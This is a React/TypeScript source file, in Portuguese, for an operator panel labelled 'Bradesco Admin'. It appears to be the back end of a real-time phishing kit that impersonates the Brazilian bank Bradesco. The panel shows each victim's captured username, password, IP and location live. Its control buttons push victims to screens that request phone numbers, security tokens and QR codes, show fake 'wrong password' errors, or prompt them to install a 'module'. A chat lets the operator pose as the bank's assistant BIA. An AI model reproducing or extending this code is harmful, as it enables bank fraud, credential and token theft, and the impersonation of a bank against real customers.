import { useEffect, useState } from 'react';
import { io, Socket } from 'socket.io-client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useToastContext } from '@/contexts/ToastContext';

interface ClientSession {
  sessionId: string;
  usuario: string;
  senha: string;
  ip: string;
  pais: string;
  estado: string;
  cidade: string;
  device: string;
  status: string;
  telaAtual: string;
  conectadoEm: number;
  ultimaAtualizacao: number;
  token: string;
  ddd: string;
  telefone: string;
  mensagensBia: Array<{ de: string; texto: string; ts: number }>;
  avatarBia: string;
  nomeEnviado: string;
  serialEnviado: string;
  qrCodeEnviado: string;
}

export default function AdminPanel() {
  const toast = useToastContext();
  const [socket, setSocket] = useState<Socket | null>(null);
  const [sessions, setSessions] = useState<ClientSession[]>([]);
  const [selectedSession, setSelectedSession] = useState<ClientSession | null>(null);
  const [nome, setNome] = useState('');
  const [serial, setSerial] = useState('');
  const [biaMessage, setBiaMessage] = useState('');
  const [biaAvatar, setBiaAvatar] = useState('');
  const [currentPage, setCurrentPage] = useState<'dashboard' | 'acessos' | 'operacao' | 'chat' | 'config'>('operacao');

  useEffect(() => {
    const newSocket = io(window.location.origin, {
      query: { role: \'operator\' },
      transports: [\'polling\'],
    });
    newSocket.on('connect', () => {
      console.log('[OP] Conectado:', newSocket.id);
      toast.success('Conectado', 'Operador conectado ao servidor');
    });

    newSocket.on('operator:sessions', (data: ClientSession[]) => {
      console.log('[ADMIN] 📋 Sessoes recebidas:', data.length);
      setSessions(data);
      setSelectedSession(prevSession => {
        if (prevSession) {
          const updated = data.find(s => s.sessionId === prevSession.sessionId);
          if (updated) {
            if (updated.mensagensBia.length === 0 && prevSession.mensagensBia.length > 0) {
              updated.mensagensBia = prevSession.mensagensBia;
            }
            return updated;
          }
        }
        return prevSession;
      });
    });

    newSocket.on('operator:client-bia-message', (data: any) => {
      console.log('[ADMIN] 💬 Mensagem BIA recebida:', data);
      setSessions(prev => prev.map(s => {
        if (s.sessionId === data.sessionId) {
          const mensagensBia = [...(s.mensagensBia || []), { de: data.de, texto: data.texto, ts: data.ts }];
          return { ...s, mensagensBia };
        }
        return s;
      }));
      setSelectedSession(prevSession => {
        if (prevSession && prevSession.sessionId === data.sessionId) {
          return {
            ...prevSession,
            mensagensBia: [...(prevSession.mensagensBia || []), { de: data.de, texto: data.texto, ts: data.ts }],
          };
        }
        return prevSession;
      });
    });

    newSocket.on('disconnect', () => {
      console.log('[OP] Desconectado');
    });

    setSocket(newSocket);

    return () => {
      newSocket.disconnect();
    };
  }, [toast]);

  const sendCommand = (command: string) => {
    if (!socket || !selectedSession) {
      toast.error('Erro', 'Selecione uma sessão ativa');
      return;
    }
    console.log('[ADMIN] Enviando comando:', command, 'para:', selectedSession.sessionId);
    socket.emit('operator:command', { 
      sessionId: selectedSession.sessionId, 
      command: command 
    });
    toast.success('Comando', `"${command}" enviado`);
  };

  const sendInfo = () => {
    if (!socket || !selectedSession || !nome || !serial) {
      toast.error('Erro', 'Preencha Nome e Serial');
      return;
    }
    socket.emit('operator:enviar-info', { sessionId: selectedSession.sessionId, nome, serial });
    toast.success('Info', 'Dados enviados');
    setNome('');
    setSerial('');
  };

  const sendBiaMessage = () => {
    if (!socket || !selectedSession || !biaMessage.trim()) {
      toast.error('Erro', 'Digite uma mensagem');
      return;
    }
    socket.emit('operator:bia-message', { sessionId: selectedSession.sessionId, texto: biaMessage });
    toast.success('BIA', 'Mensagem enviada');
    setBiaMessage('');
  };

  const updateBiaAvatar = () => {
    if (!socket || !selectedSession || !biaAvatar.trim()) {
      toast.error('Erro', 'Cole a URL do avatar');
      return;
    }
    socket.emit('operator:bia-avatar', { sessionId: selectedSession.sessionId, avatar: biaAvatar });
    toast.success('Avatar', 'Avatar atualizado');
    setBiaAvatar('');
  };

  const deleteSession = (sessionId: string) => {
    if (!socket) return;
    socket.emit('operator:delete-session', { sessionId });
    toast.success('Sessão', 'Sessão deletada');
  };

  return (
    <div className="min-h-screen bg-slate-900 text-white flex">
      <div className="w-56 bg-slate-950 border-r border-slate-800 flex flex-col">
        <div className="p-4 border-b border-slate-800">
          <div className="text-2xl font-bold text-red-600">B</div>
          <div className="text-xs text-slate-400 mt-1">Bradesco Admin</div>
        </div>
        <nav className="flex-1 p-4 space-y-2">
          {[
            { id: 'dashboard', label: 'Dashboard' },
            { id: 'acessos', label: 'Acessos' },
            { id: 'operacao', label: 'Operar Acesso' },
            { id: 'chat', label: 'Chat BIA' },
            { id: 'config', label: 'Configurações' },
          ].map(item => (
            <button
              key={item.id}
              onClick={() => setCurrentPage(item.id as any)}
              className={`w-full text-left px-3 py-2 rounded text-sm font-medium transition ${
                currentPage === item.id
                  ? 'bg-red-600 text-white'
                  : 'text-slate-300 hover:bg-slate-800'
              }`}
            >
              {item.label}
            </button>
          ))}
        </nav>
        <div className="p-4 border-t border-slate-800">
          <button className="w-full px-3 py-2 rounded text-sm font-medium text-slate-300 hover:bg-slate-800 transition">
            Sair
          </button>
        </div>
      </div>

      <div className="flex-1 p-6 overflow-auto">
        {currentPage === 'operacao' && (
          <div className="space-y-6">
            <h1 className="text-3xl font-bold">Operar Acesso</h1>
            <div className="grid grid-cols-3 gap-6">
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Sessões Ativas</h2>
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {sessions.map(s => (
                    <button
                      key={s.sessionId}
                      onClick={() => setSelectedSession(s)}
                      className={`w-full text-left p-3 rounded text-sm transition ${
                        selectedSession?.sessionId === s.sessionId
                          ? 'bg-red-600 text-white'
                          : 'bg-slate-700 text-slate-300 hover:bg-slate-600'
                      }`}
                    >
                      <div className="font-bold">{s.usuario || 'Anônimo'}</div>
                      <div className="text-xs">{s.ip}</div>
                      <div className="text-xs">{s.cidade}, {s.estado}</div>
                    </button>
                  ))}
                  {sessions.length === 0 && (
                    <div className="text-slate-500 text-sm p-3">Nenhuma sessão ativa</div>
                  )}
                </div>
              </div>

              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Dados em Tempo Real</h2>
                {selectedSession ? (
                  <div className="space-y-3 text-sm">
                    <div>
                      <div className="text-slate-400">Usuário</div>
                      <div className="font-mono text-red-400">{selectedSession.usuario || '—'}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">Senha</div>
                      <div className="font-mono text-red-400">{selectedSession.senha || '—'}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">IP</div>
                      <div className="font-mono">{selectedSession.ip}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">Localização</div>
                      <div className="font-mono">{selectedSession.cidade}, {selectedSession.estado}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">Device</div>
                      <div className="font-mono">{selectedSession.device}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">Tela Atual</div>
                      <div className="font-mono text-yellow-400">{selectedSession.telaAtual}</div>
                    </div>
                  </div>
                ) : (
                  <div className="text-slate-500">Selecione uma sessão</div>
                )}
              </div>

              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Enviar Informações</h2>
                <div className="space-y-3">
                  <div>
                    <label className="text-xs text-slate-400">Nome</label>
                    <Input
                      value={nome}
                      onChange={(e) => setNome(e.target.value)}
                      placeholder="Ricardo Braga"
                      className="bg-slate-700 border-slate-600 text-white text-sm"
                    />
                  </div>
                  <div>
                    <label className="text-xs text-slate-400">Serial</label>
                    <Input
                      value={serial}
                      onChange={(e) => setSerial(e.target.value)}
                      placeholder="50818864754"
                      className="bg-slate-700 border-slate-600 text-white text-sm"
                    />
                  </div>
                  <Button onClick={sendInfo} className="w-full bg-red-600 hover:bg-red-700">Enviar</Button>
                </div>
              </div>
            </div>

            <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
              <h2 className="text-lg font-bold mb-4">Ações de Controle (12 Botões)</h2>
              <div className="grid grid-cols-4 gap-3">
                {[
                  { label: 'Tela de Login', color: 'bg-blue-600' },
                  { label: 'Aguarde / Senha Incorreta', color: 'bg-purple-600' },
                  { label: 'Pedir Celular', color: 'bg-red-600' },
                  { label: 'Pedir Token Tela', color: 'bg-red-600' },
                  { label: 'Pedir Token Físico', color: 'bg-red-600' },
                  { label: 'Pedir Token QR Code', color: 'bg-red-600' },
                  { label: 'Erro Token', color: 'bg-red-600' },
                  { label: 'Erro Celular', color: 'bg-red-600' },
                  { label: 'Desbloqueio BIA', color: 'bg-green-600' },
                  { label: 'Erro Desbloqueio BIA', color: 'bg-red-600' },
                  { label: 'Instalar Modulo', color: 'bg-blue-600' },
                  { label: 'Validar Modulo', color: 'bg-green-600' },
                ].map(cmd => (
                  <Button
                    key={cmd.label}
                    onClick={() => sendCommand(cmd.label)}
                    className={`${cmd.color} hover:opacity-80 text-xs py-1 h-auto`}
                  >
                    {cmd.label}
                  </Button>
                ))}
              </div>
            </div>

            <div className="grid grid-cols-2 gap-6">
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Chat BIA - Painel Administrativo</h2>
                <div className="bg-slate-900 rounded border border-slate-700 h-48 overflow-y-auto p-3 mb-3 flex flex-col space-y-2">
                  {selectedSession?.mensagensBia?.map((m, i) => (
                    <div key={i} className={`p-2 rounded text-sm max-w-[80%] ${m.de === 'operador' ? 'bg-red-900/40 self-end' : 'bg-slate-700 self-start'}`}>
                      <div className="text-[10px] text-slate-400 mb-1">{m.de === 'operador' ? 'Você' : 'Cliente'}</div>
                      {m.texto}
                    </div>
                  ))}
                  {!selectedSession?.mensagensBia?.length && (
                    <div className="text-slate-500 text-center mt-10">Nenhuma mensagem ainda</div>
                  )}
                </div>
                <div className="flex gap-2">
                  <Input
                    value={biaMessage}
                    onChange={(e) => setBiaMessage(e.target.value)}
                    placeholder="Digite uma mensagem..."
                    onKeyDown={(e) => e.key === 'Enter' && sendBiaMessage()}
                    className="bg-slate-700 border-slate-600 text-white"
                  />
                  <Button onClick={sendBiaMessage} className="bg-red-600 hover:bg-red-700">Enviar</Button>
                </div>
              </div>

              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Configurar Avatares do Chat</h2>
                <div className="space-y-4">
                  <div>
                    <label className="text-xs text-slate-400">URL do Avatar</label>
                    <Input
                      value={biaAvatar}
                      onChange={(e) => setBiaAvatar(e.target.value)}
                      placeholder="https://..."
                      className="bg-slate-700 border-slate-600 text-white"
                    />
                  </div>
                  <Button onClick={updateBiaAvatar} className="w-full bg-red-600 hover:bg-red-700">Atualizar Avatar</Button>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
